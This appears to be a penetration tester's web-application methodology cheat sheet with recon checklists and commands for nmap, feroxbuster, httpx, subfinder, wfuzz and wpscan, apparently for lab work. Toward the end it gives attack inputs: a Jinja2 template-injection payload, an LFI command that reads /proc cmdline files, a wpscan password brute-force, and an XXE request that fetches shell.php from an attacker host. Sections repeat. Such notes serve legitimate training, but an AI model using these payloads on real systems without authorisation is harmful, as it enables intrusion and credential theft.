# Web Application Methodology

General operator workflow for finding and validating web attack surface before focusing on a single bug class.
Prioritize stack identification, content discovery, request/response mapping, input enumeration, and fast manual review in Burp.

## General Checklist for Web Applications

1. Disable any ad-blockers, cookie-plugins or useragent-switcher.
2. Find web servers in scope:

```bash
nmap -vv -sV -p 80,443,8080,8443,8000,8888,8800,8088,8880,10443,9443 --script http-title --open --min-rate 3000 -T4 192.168.123.100
```

3. Identify the tech stack using `whatweb`, `wappalyzer`, or `httpx`.
4. Check the website using [web-check.as93.net](https://web-check.as93.net/).
5. Use `feroxbuster` for directory enumeration:

```bash
feroxbuster -k -u http://192.168.180.100:7742/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200

# consider lower or higher -t (min 50, max 500)
```

6. Search for PDFs:

```bash
feroxbuster -u http://192.168.123.100/ -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -x pdf -q | grep '\.pdf$'
```

7. Scan with Nessus, Nuclei, Nikto, or Sn1per.
	1. `nikto --host $IP <port> -C all `
8. Check network interactions via browser DevTools.
9. Perform a Burp Suite Pro scan.
10. Enumerate subdomains:

```bash
echo domain.com | subfinder -silent | httpx -silent -sc -title -td -ip -cname -cl -lc -server -efqdn -fr
```

11. Create a list of directories using Burp Suite and input them to `feroxbuster` to get a comprehensive sitemap.
12. Find exploits using Sploitus, SearchSploit, and CVEMap.
13. Check for LFI/RFI vulnerabilities.
14. Proceed to the [Web Application Login Checklist](#web-application-login-checklist).
15. Attempt to brute-force the login page.
16. Try different usernames.
17. Check if there is a Git repository.
18. Revert the machine if necessary.
19. Remember, **Enumeration is key; step back and try harder.**
20. Verify all findings and ensure no steps were missed.

## Web Application Pre-Authentication Checklist

1. Disable ad-blockers.
2. Identify the web server in scope:

```bash
nmap -vv -sV -p 80,443 --script http-title --open --min-rate 3000 -T4 192.168.123.100
```

3. Use `whatweb` to identify the tech stack:

```bash
whatweb http://192.168.123.100:9000/
```

4. Check the website using [web-check.as93.net](https://web-check.as93.net/).
5. Use `httpx` for detailed information:

```bash
httpx -u http://192.168.123.100:9000/ -td -sc -cl -ct -location -rt -lc -wc -title -server -method -websocket -ip -cname -asn -cdn -probe
```

6. Use browser extensions like Wappalyzer and Katana.
7. Google the exact website title for additional information.
8. Run a small `feroxbuster` scan:

```bash
feroxbuster -u http://domain.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

9. Search for PDFs:

```bash
feroxbuster -u http://192.168.123.100/ -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -x pdf -q | grep '\.pdf$'
```

10. Scan with tools like Nessus, Nuclei, Nikto, and Sn1per.
11. Check network interactions via browser DevTools.
12. Perform a Burp Suite Pro scan.
13. Enumerate subdomains:

```bash
echo domain.com | subfinder -silent | httpx -silent -sc -title -td -ip -cname -cl -lc -server -fr
```

14. Create a list of directories using Burp Suite and input them to `feroxbuster`:

```bash
cat rest.txt | feroxbuster --stdin -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -E -x txt,php,html,js,json,xml,yaml,tf,sh,bash,py,tmp,lua,pem,pkk -d 2 -m POST,GET
```

15. Find exploits using Sploitus, SearchSploit, and CVEMap.
16. Check for LFI/RFI vulnerabilities.
17. Proceed to the [Web Application Login Checklist](#web-application-login-checklist).
18. Attempt to brute-force the login page.
19. Try different usernames.
20. Check if there is a Git repository.
21. Revert the machine if necessary.
22. Remember, **Enumeration is key; step back and try harder.**
23. Verify all findings and ensure no steps were missed.

## HTTP Scan

```bash
nmap --script http-headers <IP>
````

## Basic Network Tools

```bash
dig -x <IP>

nslookup <IP>

ping -a <IP>

whois <IP>
```

## WHOIS Information

```bash
whois megacorpone.com -h 192.168.50.251

whois megacorpone.com
```

## Reverse WHOIS (using a specific WHOIS server)

```bash
whois 38.100.193.70 -h 192.168.50.251
```

## Using the `host` Command (Linux)

```bash
host [www.megacorpone.com](https://www.megacorpone.com) # Gives IP address

host -t mx megacorpone.com # Shows Mail Exchange (MX) records

host -t txt megacorpone.com # Shows TXT records

host <insert subdomain>.megacorpone.com # Verify subdomain existence
```

## Scanning IP Ranges for Reverse DNS

```bash
for ip in $(seq 1 254); do host 167.114.21.$ip; done | grep -v "not found"
```

> This script attempts to resolve IPs in a range to domain names.

## General Checklist for Web Applications

1. Disable any ad-blockers, cookie-plugins or useragent-switcher.
2. Find web servers in scope:

```bash
nmap -vv -sV -p 80,443,8080,8443,8000,8888,8800,8088,8880,10443,9443 --script http-title --open --min-rate 3000 -T4 192.168.123.100
```

3. Identify the tech stack using `whatweb`, `wappalyzer`, or `httpx`.
4. Check the website using [web-check.as93.net](https://web-check.as93.net/).
5. Use `feroxbuster` for directory enumeration:

```bash
feroxbuster -u http://domain.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

6. Search for PDFs:

```bash
feroxbuster -u http://192.168.123.100/ -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -x pdf -q | grep '\.pdf$'
```

7. Scan with Nessus, Nuclei, Nikto, or Sn1per.
8. Check network interactions via browser DevTools.
9. Perform a Burp Suite Pro scan.
10. Enumerate subdomains:

```bash
echo domain.com | subfinder -silent | httpx -silent -sc -title -td -ip -cname -cl -lc -server -efqdn -fr
```

11. Create a list of directories using Burp Suite and input them to `feroxbuster` to get a comprehensive sitemap.
12. Find exploits using Sploitus, SearchSploit, and CVEMap.
13. Check for LFI/RFI vulnerabilities.
14. Proceed to the [Web Application Login Checklist](#web-application-login-checklist).
15. Attempt to brute-force the login page.
16. Try different usernames.
17. Check if there is a Git repository.
18. Revert the machine if necessary.
19. Remember, **Enumeration is key; step back and try harder.**
20. Verify all findings and ensure no steps were missed.

## Minification and Encoding

Use tools like [https://jscompress.com/](https://jscompress.com/) to minify JavaScript.

```JavaScript
function encode_to_javascript(string) {
  var input = string;
  var output = '';
  for (pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if (pos != (input.length - 1)) {
      output += ",";
    }
  }
  return output;
}

let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
JavaScript
function encode_to_javascript(string) {
  var input = string;
  var output = '';
  for (pos = 0; pos < input.length; pos++) {
    output += input.charCodeAt(pos);
    if (pos != (input.length - 1)) {
      output += ",";
    }
  }
  return output;
}

let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);
```

---

## Magic Payload

> [https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee)

```
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

## wfuzz

```
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```
```
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

## Enumerating PIDs

```
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

## WPScan

```
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```
```
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```
